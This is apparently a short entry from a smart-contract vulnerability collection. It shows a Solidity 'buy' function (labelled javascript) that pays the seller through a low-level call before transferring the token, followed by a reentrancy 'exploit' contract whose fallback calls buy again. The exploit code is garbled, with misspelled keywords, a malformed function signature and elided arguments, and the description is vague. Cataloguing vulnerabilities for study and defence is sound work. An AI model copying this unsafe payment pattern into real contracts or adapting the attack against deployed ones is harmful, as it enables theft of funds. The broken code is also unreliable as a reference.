## Vulnerable Code

```javascript
function buy(uint256 UniqueID) external payable {
        address _to = msg.sender;
        require(TokenIdtosetprice[UniqueID] == msg.value);
        TokenIdtoprice[UniqueID] = msg.value;
        uint _blooming = msg.value.div(20);
        uint _infrastructure = msg.value.div(20);
        uint _combined = _blooming.add(_infrastructure);
        uint _amount_for_seller = msg.value.sub(_combined);
        require(tokenOwner[UniqueID].call.gas(99999).value(_amount_for_seller)()); //Vulnerable position
        this.transferFrom(tokenOwner[UniqueID], _to, UniqueID);
        if(!INFRASTRUCTURE_POOL_ADDRESS.call.gas(99999).value(_infrastructure)()){
            revert("transfer to infrastructurePool failed");
		}
}
```



## Exploit Code

```javascript
Contract Attack {
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    function startAttack(){
        victimAddress.call(keccak256("buy(convertSafe(uint256 , UniqueID)")), ...,  ...);
    }
    funciton() payable{
        count++;
        if(count < 5){
            victimAddress.call(keccak256("buy(convertSafe(uint256 , UniqueID)")), ...,  ...);
        }
    }
}
```



##  Sophisticated Vulnerability Description
Look at the row "vulnerability position".The variable 'tokenOwner[UniqueID]' can be manipulated any value by a malicious contract
